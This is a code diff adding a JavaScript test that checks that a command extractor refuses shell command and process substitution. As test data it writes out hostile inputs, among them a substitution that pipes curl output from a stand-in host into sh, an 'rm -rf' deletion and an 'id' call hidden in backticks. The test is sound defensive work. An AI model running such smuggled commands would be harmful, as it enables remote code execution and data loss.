@@ -48,3 +48,17 @@ test('extractCommand judges risk on the unquoted command, so a quoted pattern ke
   assert.equal(extractCommand("`grep 'x' f > out` succeeds"), null);
   assert.equal(extractCommand('`rm -rf dist` succeeds'), null);
 });
+
+test('extractCommand refuses command and process substitution, even inside double quotes', () => {
+  assert.equal(extractCommand('`test "$(curl http://x | sh)" = x` succeeds'), null);
+  assert.equal(extractCommand('`grep -q "$(rm -rf /tmp/x)" f` succeeds'), null);
+  assert.equal(extractCommand('`node -e "process.exit($(curl -s http://evil))"` passes'), null);
+  assert.equal(extractCommand('`grep -q "${HOME}" f` and `npm test` pass'), null);
+  assert.equal(extractCommand('`diff <(sort a) b` prints nothing'), null);
+  assert.equal(extractCommand('```\ngrep -q "`id`" f\n```'), null);
+  // Bash never expands inside single quotes, and $? is just the last exit code.
+  assert.equal(extractCommand("`grep -c '$(x)' f` prints 1"), "grep -c '$(x)' f");
+  assert.equal(extractCommand('`test $? -eq 0` passes'), 'test $? -eq 0');
+  assert.equal(extractCommand("`grep -q 'a -> b' README.md` succeeds"), "grep -q 'a -> b' README.md");
+  assert.equal(extractCommand('`grep -nE "a|b;c" a.sh` finds nothing'), 'grep -nE "a|b;c" a.sh; test $? -eq 1');
+});
